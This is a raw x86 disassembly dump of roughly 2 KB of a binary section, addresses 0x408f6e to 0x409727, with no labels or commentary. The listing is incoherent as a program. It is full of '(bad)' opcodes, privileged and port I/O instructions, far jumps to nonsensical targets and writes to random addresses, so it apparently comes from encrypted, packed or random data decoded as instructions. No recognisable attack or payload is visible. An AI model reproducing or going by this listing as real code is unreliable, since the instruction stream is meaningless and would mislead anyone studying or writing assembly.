  408f6e:	call   0x9188:0x3ae6eed6
  408f75:	cmp    dl,al
  408f77:	mov    DWORD PTR [esi+0x5d5b741c],edi
  408f7d:	push   esp
  408f7e:	mov    ebp,0x829d431f
  408f83:	add    al,0x87
  408f85:	scas   al,BYTE PTR es:[edi]
  408f86:	faddp  st(1),st
  408f88:	dec    edx
  408f89:	jp     0x408fdb
  408f8b:	std    
  408f8c:	scas   al,BYTE PTR es:[edi]
  408f8d:	dec    ecx
  408f8e:	pop    ss
  408f8f:	pushf  
  408f90:	mov    al,ds:0x4b482bc
  408f95:	mov    dl,0xab
  408f97:	arpl   WORD PTR [edx-0x64],di
  408f9a:	cmp    edx,ebp
  408f9c:	push   edi
  408f9d:	adc    DWORD PTR [ebp+ecx*8-0x2d],0x71fdaf7b
  408fa5:	jne    0x409018
  408fa7:	dec    edx
  408fa8:	dec    esi
  408fa9:	mov    ah,0xc0
  408fab:	cmp    cl,ah
  408fad:	dec    esp
  408fae:	xor    al,BYTE PTR fs:[esp+edi*2+0x33b87c62]
  408fb6:	cmp    eax,0x3071bc4a
  408fbb:	clc    
  408fbc:	aad    0xe0
  408fbe:	add    eax,0x8f9c9e1a
  408fc3:	cmp    esi,eax
  408fc5:	jo     0x408ffa
  408fc7:	stc    
  408fc8:	mov    DWORD PTR [ecx+0x79],esi
  408fcb:	mov    esp,0xcdd8c82c
  408fd0:	jbe    0x408f89
  408fd2:	rcr    DWORD PTR [edi+eax*1],1
  408fd5:	xor    bl,BYTE PTR [edx-0x5d55f38a]
  408fdb:	inc    esi
  408fdc:	inc    ebp
  408fdd:	push   0x1e
  408fdf:	push   eax
  408fe0:	push   ss
  408fe1:	jmp    0xf982:0xee874fb2
  408fe8:	ret    0x7661
  408feb:	mov    edi,0xf01de972
  408ff0:	into   
  408ff1:	out    0x94,eax
  408ff3:	aas    
  408ff4:	xor    DWORD PTR [ebp+0x58],esi
  408ff7:	cmp    DWORD PTR [eax-0x6f896bcd],esp
  408ffd:	add    ch,BYTE PTR [edx+0x32]
  409000:	or     BYTE PTR [edx+0x6e],dl
  409003:	mov    DWORD PTR [ebp+ecx*1+0x471c0fef],eax
  40900a:	xor    dl,0x8d
  40900d:	cmp    bh,bh
  40900f:	jmp    0x27d81176
  409014:	add    eax,0x7ff073ce
  409019:	jmp    0x40904f
  40901b:	adc    BYTE PTR [ecx-0x9d8815b],dl
  409021:	neg    BYTE PTR [ebx]
  409023:	cs cmp dl,ah
  409026:	ins    DWORD PTR es:[edi],dx
  409027:	loopne 0x40904e
  409029:	es loope 0x409062
  40902c:	sub    ebx,DWORD PTR [esi+0x71]
  40902f:	inc    ebx
  409030:	pop    edx
  409031:	pusha  
  409032:	rcr    al,1
  409034:	inc    eax
  409035:	mov    al,ds:0xe56526a1
  40903a:	cmp    al,0x7e
  40903c:	fwait
  40903d:	xor    eax,0x6e944191
  409042:	test   al,0x8e
  409044:	jne    0x409064
  409046:	jmp    0x40902a
  409048:	ja     0x4090a8
  40904a:	pop    ecx
  40904b:	out    dx,eax
  40904c:	pop    es
  40904d:	sahf   
  40904e:	jbe    0x40908f
  409050:	or     esi,DWORD PTR ds:0x3d0d332c
  409056:	push   eax
  409057:	aam    0x5f
  409059:	ss pusha 
  40905b:	sbb    BYTE PTR [ebp+0x11ca87c3],0xaa
  409062:	adc    esi,DWORD PTR [ebx+ebx*2]
  409065:	mov    BYTE PTR gs:[edi],ch
  409068:	loopne 0x409076
  40906a:	lods   al,BYTE PTR ds:[esi]
  40906b:	in     eax,dx
  40906c:	loope  0x409064
  40906e:	loope  0x409075
  409070:	popa   
  409071:	ror    DWORD PTR [ecx-0x69cbcb40],cl
  409077:	cmp    eax,0xfd9826ac
  40907c:	in     al,dx
  40907d:	scas   eax,DWORD PTR es:[edi]
  40907e:	in     eax,dx
  40907f:	pop    ebx
  409080:	adc    ch,BYTE PTR [eax]
  409082:	imul   ebx,edx,0xffffffa0
  409085:	jmp    0x2cd0b1f9
  40908a:	mov    eax,ds:0x472c9c1f
  40908f:	jbe    0x40910c
  409091:	frstor [edx]
  409093:	adc    BYTE PTR [esi+eax*2-0x78ee9021],0x58
  40909b:	repnz xchg ebp,eax
  40909d:	adc    edi,esp
  40909f:	mov    bl,0xdf
  4090a1:	fadd   DWORD PTR [edx]
  4090a3:	loopne 0x40909f
  4090a5:	mov    ch,0xed
  4090a7:	loope  0x4090b1
  4090a9:	adc    al,0xac
  4090ab:	mov    cl,0x2f
  4090ad:	enter  0xd97f,0x35
  4090b1:	(bad)  
  4090b2:	adc    DWORD PTR [ecx+0x63cdc297],eax
  4090b8:	mov    ?,WORD PTR [ebx+0x3]
  4090bb:	test   DWORD PTR [eax-0x5ae4080d],esp
  4090c1:	mov    al,0x32
  4090c3:	stos   BYTE PTR es:[edi],al
  4090c4:	adc    eax,eax
  4090c6:	leave  
  4090c7:	fisttp DWORD PTR [edi+0x15]
  4090ca:	pop    edx
  4090cb:	pop    eax
  4090cc:	adc    cl,BYTE PTR [ebx]
  4090ce:	sbb    esp,esi
  4090d0:	das    
  4090d1:	mov    DWORD PTR [edi+0x498d8db9],eax
  4090d7:	rol    BYTE PTR [ebx-0x2b],0x4c
  4090db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4090dc:	jmp    0x409102
  4090de:	adc    eax,0x326912c2
  4090e3:	inc    ecx
  4090e4:	pop    ds
  4090e5:	in     eax,dx
  4090e6:	clc    
  4090e7:	std    
  4090e8:	jno    0x4090a0
  4090ea:	add    al,0x75
  4090ec:	or     ebx,DWORD PTR ds:0x979ebb5d
  4090f2:	test   BYTE PTR [ebx+0x3f84e340],0x4
  4090f9:	push   ss
  4090fa:	adc    edi,DWORD PTR [edx-0x60]
  4090fd:	lea    eax,[edi+0x73]
  409100:	add    al,0xaa
  409102:	test   eax,0xd25e7438
  409107:	fild   DWORD PTR [ecx-0x8c02059]
  40910d:	dec    eax
  40910e:	push   0x14
  409110:	aad    0xd2
  409112:	call   FWORD PTR [ebx+0xd6eee0c]
  409118:	and    dl,BYTE PTR [ebx-0x408ce735]
  40911e:	jl     0x409159
  409120:	out    0xfc,al
  409122:	rcr    DWORD PTR [eax+0xbb6b5ce],0xe6
  409129:	dec    esi
  40912a:	inc    ebx
  40912b:	jle    0x409183
  40912d:	jne    0x4090c1
  40912f:	pop    esp
  409130:	inc    edi
  409131:	mov    dl,0x13
  409133:	and    DWORD PTR [eax+edi*2],0xffffffa5
  409137:	fcomp  st(1)
  409139:	mov    bl,0x5d
  40913b:	les    eax,FWORD PTR ds:0x63f8c9ee
  409141:	es jbe 0x409104
  409144:	sahf   
  409145:	xchg   esp,eax
  409146:	enter  0x1794,0x3b
  40914a:	add    BYTE PTR [ecx+0x6938a14c],cl
  409150:	and    ebx,DWORD PTR [edi+0x3c]
  409153:	cwde   
  409154:	push   esi
  409155:	retf   0x322a
  409158:	aam    0x6a
  40915a:	or     eax,DWORD PTR [edx]
  40915c:	and    BYTE PTR [ecx-0x1a587ff9],ch
  409162:	les    ecx,FWORD PTR [ecx]
  409164:	es (bad) 
  409166:	outs   dx,DWORD PTR ds:[esi]
  409167:	ds into 
  409169:	mov    ebx,DWORD PTR [eax+0x1704543d]
  40916f:	div    DWORD PTR [edx+0xad1c2cf]
  409175:	dec    edi
  409176:	(bad)  
  409177:	cdq    
  409178:	and    al,0x2d
  40917a:	mov    edx,0x746e345c
  40917f:	loopne 0x4091e4
  409181:	ficom  DWORD PTR [edi]
  409183:	jnp    0x4091e9
  409185:	inc    edi
  409186:	pop    es
  409187:	in     al,0xbf
  409189:	inc    ebp
  40918a:	fwait
  40918b:	dec    ebx
  40918c:	lea    ecx,[eax+0x20254d9d]
  409192:	or     ah,0xab
  409195:	mov    dl,al
  409197:	push   ebx
  409198:	mov    ah,0x81
  40919a:	ins    DWORD PTR es:[edi],dx
  40919b:	mov    ds:0xeadde8f6,eax
  4091a0:	outs   dx,BYTE PTR ds:[esi]
  4091a1:	and    DWORD PTR ds:0xbae794f5,0x53
  4091a8:	dec    ebp
  4091a9:	pop    ds
  4091aa:	jae    0x4091cd
  4091ac:	sub    al,0x72
  4091ae:	jb     0x4091db
  4091b0:	arpl   WORD PTR [ebx+ebx*4],bx
  4091b3:	test   eax,0xd35413
  4091b8:	cs clc 
  4091ba:	pop    edx
  4091bb:	loopne 0x4091e2
  4091bd:	cmp    edi,DWORD PTR [eax]
  4091bf:	mov    gs,WORD PTR ds:[ebx+0x57a48705]
  4091c6:	or     edi,DWORD PTR [ebx+eiz*4]
  4091c9:	and    cl,bl
  4091cb:	pusha  
  4091cc:	cmp    DWORD PTR [ebp-0x55906321],edi
  4091d2:	out    0x3a,eax
  4091d4:	in     al,dx
  4091d5:	out    dx,al
  4091d6:	fwait
  4091d7:	mov    ebp,0xca878957
  4091dc:	adc    BYTE PTR [ecx+0x7e474982],cl
  4091e2:	sub    BYTE PTR [eax-0x7e79b2de],0xd0
  4091e9:	mov    edi,0xf8002feb
  4091ee:	fmulp  st(6),st
  4091f0:	xchg   ecx,eax
  4091f1:	adc    eax,DWORD PTR [edi-0x37c512be]
  4091f7:	xor    DWORD PTR [edi],esi
  4091f9:	fsub   QWORD PTR [ebx-0x33]
  4091fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091fd:	push   esi
  4091fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091ff:	scas   eax,DWORD PTR es:[edi]
  409200:	inc    ebx
  409201:	and    BYTE PTR [ebx+0x25177191],bh
  409207:	ror    BYTE PTR [esi],cl
  409209:	mov    dl,0x1a
  40920b:	and    ah,0x6
  40920e:	clc    
  40920f:	mov    ch,0x55
  409211:	inc    esi
  409212:	push   esi
  409213:	lea    ebp,[ecx]
  409215:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409216:	fidiv  WORD PTR [esi]
  409218:	cmp    DWORD PTR [edx],ecx
  40921a:	imul   esi,DWORD PTR [ebp-0x47],0x1a
  40921e:	or     BYTE PTR [ebp-0x3b4ef894],cl
  409224:	xor    ah,BYTE PTR [ebx-0x7d]
  409227:	imul   esi,DWORD PTR [esi],0xc06d2f79
  40922d:	addr16 cmp al,0xd9
  409230:	jmp    ecx
  409232:	cmp    ebp,eax
  409234:	push   ebx
  409235:	sub    DWORD PTR [esp+ebx*1],0xc
  409239:	(bad)  
  40923a:	adc    al,0x10
  40923c:	ret    
  40923d:	sbb    BYTE PTR [ebx+edi*1+0x4cabe20e],cl
  409244:	xor    cl,BYTE PTR [edx]
  409246:	sbb    edi,DWORD PTR [ebx+0x1d603978]
  40924c:	push   0x6b
  40924e:	popf   
  40924f:	pop    eax
  409250:	and    BYTE PTR [ebp+ecx*8-0x59],ah
  409254:	iret   
  409255:	aaa    
  409256:	ins    BYTE PTR es:[edi],dx
  409257:	mov    ecx,0x93646cf3
  40925c:	sub    DWORD PTR [edx+esi*8+0x28],edi
  409260:	and    al,0x20
  409262:	add    esp,edi
  409264:	bound  edi,QWORD PTR [ebp-0x5235747a]
  40926a:	sub    BYTE PTR [ebp+esi*2+0xc6be6c2],0x8
  409272:	rol    DWORD PTR [edi-0x74],1
  409275:	sbb    BYTE PTR [esi],al
  409277:	jns    0x409276
  409279:	xchg   esi,eax
  40927a:	dec    esp
  40927b:	shr    DWORD PTR [eax],cl
  40927d:	xor    al,0x40
  40927f:	punpckhwd mm6,QWORD PTR [esi+0x6cbec063]
  409286:	test   DWORD PTR [edi+ebx*2],ebx
  409289:	int3   
  40928a:	sub    BYTE PTR [edx],bl
  40928c:	mov    bh,0x67
  40928e:	sub    BYTE PTR [ecx+0x3696eba8],dl
  409294:	aad    0x2a
  409296:	xor    bl,BYTE PTR [edi+0x16]
  409299:	push   ecx
  40929a:	cs inc ebx
  40929c:	loopne 0x4092ee
  40929e:	cmp    ebx,DWORD PTR [ebp-0x69]
  4092a1:	pop    esi
  4092a2:	cdq    
  4092a3:	xchg   ecx,eax
  4092a4:	ffreep st(7)
  4092a6:	sbb    al,0x2f
  4092a8:	push   esp
  4092a9:	jl     0x409292
  4092ab:	das    
  4092ac:	bound  ebx,QWORD PTR [edx]
  4092ae:	(bad)  
  4092b0:	popa   
  4092b1:	inc    edx
  4092b2:	inc    ebp
  4092b3:	inc    ebp
  4092b4:	cmp    al,0x42
  4092b6:	(bad)  
  4092b7:	push   ds
  4092b8:	scas   al,BYTE PTR es:[edi]
  4092b9:	lock push esi
  4092bb:	inc    edi
  4092bc:	std    
  4092bd:	sub    al,0x69
  4092bf:	xor    esi,DWORD PTR [ebx+0x4b72c8ba]
  4092c5:	(bad)  
  4092c7:	dec    ebx
  4092c8:	iret   
  4092c9:	add    ch,bl
  4092cb:	inc    ebp
  4092cc:	adc    BYTE PTR [ecx+0x13],bh
  4092cf:	stos   DWORD PTR es:[edi],eax
  4092d0:	pop    esi
  4092d1:	push   ecx
  4092d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092d3:	jmp    0x93e00932
  4092d8:	push   edi
  4092d9:	xchg   esi,eax
  4092da:	fs dec esi
  4092dc:	cld    
  4092dd:	mov    ah,0xba
  4092df:	or     ecx,ebp
  4092e1:	rcr    BYTE PTR [esi+0x5b4e13fa],cl
  4092e7:	mov    esp,0xd2f7d6bf
  4092ec:	rcl    BYTE PTR [edx-0x60322f0e],0x3e
  4092f3:	es adc dl,bl
  4092f6:	cmp    al,0x39
  4092f8:	into   
  4092f9:	je     0x409288
  4092fb:	or     DWORD PTR [eax-0x2],eax
  4092fe:	out    dx,al
  4092ff:	push   eax
  409300:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409301:	nop
  409302:	and    ebx,DWORD PTR [ecx]
  409304:	push   ecx
  409305:	lahf   
  409306:	pop    es
  409307:	push   esp
  409308:	fst    QWORD PTR [edx-0x19]
  40930b:	(bad)  
  40930c:	mov    WORD PTR [ebx+esi*1+0x4a],gs
  409310:	pop    ss
  409311:	and    eax,0x70f44b64
  409316:	cmp    DWORD PTR [ebp+eax*1+0x13],ebp
  40931a:	aaa    
  40931b:	cmp    edi,DWORD PTR [edx]
  40931d:	xchg   al,bl
  40931f:	into   
  409320:	adc    eax,0x2b127b50
  409325:	push   ds
  409326:	outs   dx,DWORD PTR ds:[esi]
  409327:	clc    
  409328:	jp     0x409341
  40932a:	loopne 0x4092f1
  40932c:	into   
  40932d:	xchg   ecx,eax
  40932e:	cmp    eax,0xbd25c62a
  409333:	jp     0x4092e8
  409335:	add    bl,BYTE PTR [edi+ebp*2+0x4a]
  409339:	pop    esp
  40933a:	xlat   BYTE PTR ds:[ebx]
  40933b:	adc    al,0x1d
  40933d:	push   ds
  40933e:	sti    
  40933f:	pop    eax
  409340:	jecxz  0x4093ab
  409342:	pop    edi
  409343:	stos   DWORD PTR es:[edi],eax
  409344:	inc    edi
  409345:	fadd   QWORD PTR [ebx+0x67]
  409348:	mov    eax,ds:0xe46b55dd
  40934d:	or     al,0x8a
  40934f:	mov    DWORD PTR [ecx],eax
  409351:	(bad)  
  409352:	clc    
  409353:	cmp    eax,0x17bc9017
  409358:	xchg   ebp,eax
  409359:	mov    eax,ds:0xfec4014d
  40935e:	leave  
  40935f:	mov    edx,0xd51b37a7
  409364:	pop    ebx
  409365:	dec    ebp
  409366:	fdiv   DWORD PTR [ebx]
  409368:	add    BYTE PTR [ebx+esi*4+0x64f4d880],ah
  40936f:	xchg   esi,eax
  409370:	das    
  409371:	lods   al,BYTE PTR ds:[esi]
  409372:	xchg   ebx,eax
  409373:	fs xchg esi,eax
  409375:	jae    0x4093b4
  409377:	mov    bl,0x71
  409379:	pop    es
  40937a:	mov    al,ds:0xded3440d
  40937f:	sub    BYTE PTR [eax-0x3f00c31f],0x47
  409386:	fadd   DWORD PTR [edx]
  409388:	pop    ecx
  409389:	sbb    al,0x64
  40938b:	inc    eax
  40938c:	adc    eax,0xdd4c9034
  409391:	push   esi
  409392:	inc    ebp
  409393:	aam    0x81
  409395:	icebp  
  409396:	xor    BYTE PTR [edi],cl
  409398:	outs   dx,BYTE PTR ds:[esi]
  409399:	inc    edx
  40939a:	xchg   ebp,eax
  40939b:	inc    eax
  40939c:	leave  
  40939d:	push   eax
  40939e:	pop    ecx
  40939f:	scas   al,BYTE PTR es:[edi]
  4093a0:	xor    BYTE PTR [ebx],ah
  4093a2:	scas   al,BYTE PTR es:[edi]
  4093a3:	mov    ebp,0xe2adff3
  4093a8:	pop    esi
  4093a9:	push   0xb3260544
  4093ae:	pop    es
  4093af:	inc    edi
  4093b0:	pop    ds
  4093b1:	cmp    BYTE PTR [ecx],dl
  4093b3:	fld    TBYTE PTR [edx+eiz*8+0x7e]
  4093b8:	shr    DWORD PTR [esi],cl
  4093ba:	jle    0x409423
  4093bc:	mov    dh,0x30
  4093be:	jecxz  0x40943a
  4093c0:	cmp    eax,0x3f8882ca
  4093c5:	push   cs
  4093c6:	aas    
  4093c7:	ret    
  4093c8:	arpl   WORD PTR [esi-0x48cbdcee],dx
  4093ce:	sbb    eax,esp
  4093d0:	pop    edx
  4093d1:	leave  
  4093d2:	push   edx
  4093d3:	xor    ch,BYTE PTR [esi]
  4093d5:	jge    0x40940b
  4093d7:	dec    ecx
  4093d8:	jmp    0x2477a720
  4093dd:	aam    0x57
  4093df:	mov    edi,0xb670a3e1
  4093e4:	adc    ebp,DWORD PTR [ebp+ebp*2-0x47]
  4093e8:	mov    ecx,0x79feb6c2
  4093ed:	into   
  4093ee:	fnstcw WORD PTR [ebx]
  4093f0:	xchg   esi,eax
  4093f1:	adc    dl,BYTE PTR [edi+0x4115bc20]
  4093f7:	push   es
  4093f8:	cwde   
  4093f9:	jae    0x409404
  4093fb:	ret    
  4093fc:	xor    DWORD PTR [esi+0x1a93e690],0x8f0468b3
  409406:	add    bh,BYTE PTR [ebp+0x3bf1bb3c]
  40940c:	fist   WORD PTR [edx]
  40940e:	mov    ds:0xa2635db,eax
  409413:	and    edx,0x2fa996f3
  409419:	in     al,dx
  40941a:	inc    esi
  40941b:	pop    esp
  40941c:	pop    es
  40941d:	sar    DWORD PTR [edx],cl
  40941f:	mov    BYTE PTR [ebp+eiz*1-0x4c],0xac
  409424:	xchg   edi,eax
  409425:	fdivr  DWORD PTR [edi-0x3c376592]
  40942b:	stos   BYTE PTR es:[edi],al
  40942c:	cli    
  40942d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40942e:	adc    al,0xb7
  409430:	dec    esi
  409431:	loope  0x409408
  409433:	stos   BYTE PTR es:[edi],al
  409434:	cld    
  409435:	or     BYTE PTR [ebp-0x74b35dac],0xa
  40943c:	sub    esp,ebp
  40943e:	mov    eax,0xaab406bf
  409443:	and    al,0xcd
  409445:	mov    ch,0xf7
  409447:	bound  esi,QWORD PTR [ebp+0x61327b5a]
  40944d:	leave  
  40944e:	xlat   BYTE PTR ds:[ebx]
  40944f:	xor    BYTE PTR ds:0xf97ea8cd,bh
  409455:	fs inc edi
  409457:	cmp    al,0x9a
  409459:	xor    BYTE PTR [esi-0x42],ah
  40945c:	aaa    
  40945d:	cmp    eax,0x3f638917
  409462:	repnz enter 0x84b8,0xe6
  409467:	out    dx,al
  409468:	dec    eax
  409469:	jb     0x409455
  40946b:	repz sub eax,0xa24ad5e3
  409471:	add    BYTE PTR [eax-0x5ab0979a],dl
  409477:	cmp    eax,0x37b6d0d0
  40947c:	cwde   
  40947d:	mov    cl,0x30
  40947f:	movups XMMWORD PTR [ebx-0x3e3899f],xmm6
  409486:	push   eax
  409487:	jnp    0x40942a
  409489:	fcmovnu st,st(6)
  40948b:	bsr    esi,DWORD PTR [edx-0x593b9ed1]
  409492:	mov    WORD PTR [edi-0x1c],cs
  409495:	gs dec ebx
  409498:	leave  
  409499:	jmp    0xa72a6eb3
  40949e:	stc    
  40949f:	add    al,0xef
  4094a1:	fstp   st(0)
  4094a3:	push   ds
  4094a4:	cmc    
  4094a5:	repz add BYTE PTR gs:[eax-0x4],dl
  4094aa:	push   ds
  4094ab:	lds    edx,FWORD PTR [ecx]
  4094ad:	jns    0x4094b9
  4094af:	leave  
  4094b0:	jo     0x4094a0
  4094b2:	pop    ebx
  4094b3:	aam    0x2c
  4094b5:	pop    eax
  4094b6:	jne    0x409521
  4094b8:	sub    eax,0xb7351c40
  4094bd:	popf   
  4094be:	cdq    
  4094bf:	js     0x4094f4
  4094c1:	pop    ss
  4094c2:	add    eax,DWORD PTR ds:0x1db0db7a
  4094c8:	or     bh,BYTE PTR [esp+eax*8-0x6d]
  4094cc:	out    dx,eax
  4094cd:	adc    al,0x97
  4094cf:	adc    esi,DWORD PTR [ebp-0x5ba66b99]
  4094d5:	hlt    
  4094d6:	fidiv  DWORD PTR [ecx+0x7b75cf0c]
  4094dc:	push   0x741227ce
  4094e1:	and    al,0x6e
  4094e3:	add    eax,0xe6f8e342
  4094e8:	push   esi
  4094e9:	push   ebx
  4094ea:	cmp    cl,dh
  4094ec:	pop    ds
  4094ed:	xor    cl,cl
  4094ef:	(bad)  
  4094f0:	sbb    ah,al
  4094f2:	push   edi
  4094f3:	dec    ebp
  4094f4:	xor    esi,DWORD PTR [ebp+0xa0951a7]
  4094fa:	and    al,0xf0
  4094fc:	rol    DWORD PTR [edi-0x7e209b5d],0x4c
  409503:	xchg   esi,eax
  409504:	popf   
  409505:	retf   
  409506:	xchg   ebp,eax
  409507:	dec    esi
  409508:	popa   
  409509:	pop    ebx
  40950a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40950b:	iret   
  40950c:	lods   al,BYTE PTR ds:[esi]
  40950d:	ins    BYTE PTR es:[edi],dx
  40950e:	inc    edi
  40950f:	and    DWORD PTR [eax],eax
  409511:	pop    ebp
  409512:	stos   DWORD PTR es:[edi],eax
  409513:	adc    BYTE PTR [ecx],0x8b
  409516:	(bad)  
  409517:	stos   DWORD PTR es:[edi],eax
  409518:	sbb    DWORD PTR [ecx+ebx*4+0x3a],0xffffffcf
  40951d:	jbe    0x4094a7
  40951f:	sub    eax,0x6822315e
  409524:	in     eax,0xe7
  409526:	loop   0x4094fc
  409528:	mov    al,ds:0x4cc34b10
  40952d:	iret   
  40952e:	xor    eax,0xf8882f81
  409533:	not    bl
  409535:	iret   
  409536:	jns    0x40953f
  409538:	dec    ebx
  409539:	mov    ebp,0xe7407510
  40953e:	push   edi
  40953f:	clc    
  409540:	(bad)  
  409541:	jge    0x4095ba
  409543:	adc    ah,ah
  409545:	mov    eax,ds:0x13274c32
  40954a:	dec    edi
  40954b:	pusha  
  40954c:	push   edi
  40954d:	or     eax,0x858abbb0
  409552:	cs adc al,0x20
  409555:	daa    
  409556:	icebp  
  409557:	in     eax,dx
  409558:	pop    ds
  409559:	push   esp
  40955a:	inc    edi
  40955b:	dec    ebx
  40955c:	shl    BYTE PTR [ecx],cl
  40955e:	das    
  40955f:	sbb    al,0x9
  409561:	call   0x4a0e:0xf40b9cf7
  409568:	pusha  
  409569:	xor    al,0x42
  40956b:	ins    DWORD PTR es:[edi],dx
  40956c:	rcr    DWORD PTR [edx],1
  40956e:	push   esp
  40956f:	stc    
  409570:	data16 or dh,bl
  409573:	std    
  409574:	push   ebx
  409575:	repz dec edx
  409577:	rcr    DWORD PTR [esi-0x46],cl
  40957a:	or     eax,0x7bbcbd9e
  40957f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409580:	mov    ah,0x4
  409582:	repnz repz mov eax,ds:0x8164d047
  409589:	jg     0x409528
  40958b:	mul    eax
  40958d:	loop   0x40957b
  40958f:	fimul  WORD PTR [ebp-0x73fd1313]
  409595:	test   al,0x33
  409597:	or     DWORD PTR [esi],0x70652ac7
  40959d:	xor    edi,esi
  40959f:	pop    eax
  4095a0:	lods   al,BYTE PTR ds:[esi]
  4095a1:	mov    bh,0x8b
  4095a3:	pop    ds
  4095a4:	test   ebp,ebp
  4095a6:	or     eax,0x2939bcd7
  4095ab:	xchg   DWORD PTR [ebp+edi*4-0x46],esp
  4095af:	out    0x55,eax
  4095b1:	ins    DWORD PTR es:[edi],dx
  4095b2:	dec    esi
  4095b3:	jns    0x40959d
  4095b5:	sti    
  4095b6:	cmp    eax,0xcb6f4ca4
  4095bb:	push   0x6e
  4095bd:	out    0x76,eax
  4095bf:	fiadd  DWORD PTR [ebx+0x6ead65f5]
  4095c5:	xor    bl,BYTE PTR [ecx-0x535457d5]
  4095cb:	and    BYTE PTR [ebp+0x3557636c],al
  4095d1:	or     bh,bl
  4095d3:	gs push ss
  4095d5:	push   0x751e8a90
  4095da:	dec    esp
  4095db:	popa   
  4095dc:	iret   
  4095dd:	cmp    eax,0xc9f6ac37
  4095e2:	cwde   
  4095e3:	push   edi
  4095e4:	ja     0x4095e3
  4095e6:	pop    ecx
  4095e7:	cli    
  4095e8:	adc    bh,BYTE PTR [ecx]
  4095ea:	mov    eax,0xdba46731
  4095ef:	(bad)  
  4095f0:	dec    ebx
  4095f1:	cli    
  4095f2:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4095f4:	nop
  4095f5:	jp     0x409669
  4095f7:	pushf  
  4095f8:	jmp    0xbe9a4d3b
  4095fd:	push   edi
  4095fe:	mov    fs,ebp
  409600:	ds dec ecx
  409602:	mov    dh,0x77
  409604:	jl     0x4095fd
  409606:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409607:	scas   eax,DWORD PTR es:[edi]
  409608:	shl    DWORD PTR [edi+0xbc858fc],1
  40960e:	sbb    al,0x47
  409610:	aas    
  409611:	dec    esp
  409612:	aaa    
  409613:	jg     0x409661
  409615:	mov    es,esi
  409617:	jl     0x40965a
  409619:	xchg   DWORD PTR ds:0x3a0193d4,ebx
  40961f:	pop    es
  409620:	dec    ebx
  409621:	daa    
  409622:	out    dx,eax
  409623:	adc    BYTE PTR [ebp+edx*4+0x65],dh
  409627:	clc    
  409628:	cmp    BYTE PTR ds:[eax],ah
  40962b:	mov    dl,0x46
  40962d:	popf   
  40962e:	jns    0x4096a3
  409630:	lock mov ch,0x27
  409633:	jecxz  0x4095d1
  409635:	xchg   esp,eax
  409636:	push   ebx
  409637:	stos   BYTE PTR es:[edi],al
  409638:	add    ah,cl
  40963a:	jmp    0x409685
  40963c:	and    DWORD PTR [eax+0x7d],esp
  40963f:	or     al,0x46
  409641:	stos   BYTE PTR es:[edi],al
  409642:	clc    
  409643:	std    
  409644:	adc    al,0xe9
  409646:	xchg   edx,eax
  409647:	loopne 0x40963d
  409649:	or     al,BYTE PTR [edi+0x19a996bc]
  40964f:	xchg   ebp,edx
  409651:	retf   
  409652:	and    ebx,0xe30fd595
  409658:	dec    eax
  409659:	cmp    DWORD PTR [esi+0x76],ebp
  40965c:	pop    ecx
  40965d:	fs (bad) 
  40965f:	or     BYTE PTR [esi+0x642d4be3],cl
  409665:	rol    ah,1
  409667:	lea    ebx,[ebx]
  409669:	push   0x24
  40966b:	or     dl,dh
  40966d:	and    bh,al
  40966f:	adc    al,0x7b
  409671:	pop    edi
  409672:	add    DWORD PTR [eax],ebp
  409674:	sub    ch,BYTE PTR [ebx-0x3b72fbc1]
  40967a:	mov    ecx,0x57be026d
  40967f:	pop    eax
  409680:	aaa    
  409681:	je     0x409700
  409683:	pop    esp
  409684:	mov    al,0xe0
  409686:	in     eax,dx
  409687:	and    eax,0xb6e848c2
  40968c:	inc    ebx
  40968d:	xlat   BYTE PTR ds:[ebx]
  40968e:	dec    eax
  40968f:	sub    eax,esp
  409691:	push   ss
  409692:	test   BYTE PTR [edi-0x68105107],dh
  409698:	dec    ebp
  409699:	push   0xffffffa8
  40969b:	fist   DWORD PTR [edi+0x5465d0bd]
  4096a1:	ret    
  4096a2:	in     al,0x8f
  4096a4:	add    BYTE PTR [edi+0x67],bl
  4096a7:	pop    esp
  4096a8:	add    bl,BYTE PTR [ebx]
  4096aa:	adc    al,0x45
  4096ac:	std    
  4096ad:	xor    al,BYTE PTR [ebx-0x3d127773]
  4096b3:	(bad)  
  4096b4:	xor    esp,edi
  4096b6:	(bad)  
  4096b7:	fild   DWORD PTR [esi-0x41]
  4096ba:	xchg   ebx,eax
  4096bb:	pop    edi
  4096bc:	xlat   BYTE PTR ds:[ebx]
  4096bd:	mov    al,0xd
  4096bf:	into   
  4096c0:	fcomp  QWORD PTR [ebx+0x5becaf01]
  4096c6:	arpl   WORD PTR [ebx+0x4b],bx
  4096c9:	jb     0x409676
  4096cb:	stos   BYTE PTR es:[edi],al
  4096cc:	psubusb xmm5,XMMWORD PTR [bp+di]
  4096d1:	and    DWORD PTR [ebx-0x7eeb74db],esp
  4096d7:	dec    eax
  4096d8:	fldln2 
  4096da:	jmp    DWORD PTR [esi+edi*2]
  4096dd:	sub    al,0xeb
  4096df:	std    
  4096e0:	cmp    eax,0x3e27b853
  4096e5:	add    eax,0x24c73919
  4096ea:	adc    al,0x6f
  4096ec:	inc    ecx
  4096ed:	mov    BYTE PTR [ebx+ebp*8],al
  4096f0:	cli    
  4096f1:	ltr    bx
  4096f4:	in     al,dx
  4096f5:	inc    eax
  4096f6:	pusha  
  4096f7:	sbb    cl,BYTE PTR [edx+0x26612c69]
  4096fd:	pop    ebp
  4096fe:	lea    ecx,[edx+esi*1]
  409701:	ins    BYTE PTR es:[edi],dx
  409702:	mov    ebp,0xfb00b0b0
  409707:	xchg   edi,eax
  409708:	mov    ds:0x48b551ca,al
  40970d:	(bad)  
  40970e:	es jge 0x40974a
  409711:	in     eax,0x90
  409713:	adc    ch,BYTE PTR [esi+0x4f]
  409716:	sbb    al,0x84
  409718:	inc    eax
  409719:	mov    al,0xd2
  40971b:	jns    0x409744
  40971d:	xor    eax,0xbd251b44
  409722:	mov    ds:0x173cdfd2,eax
  409727:	add    eax,0x8813aa1c
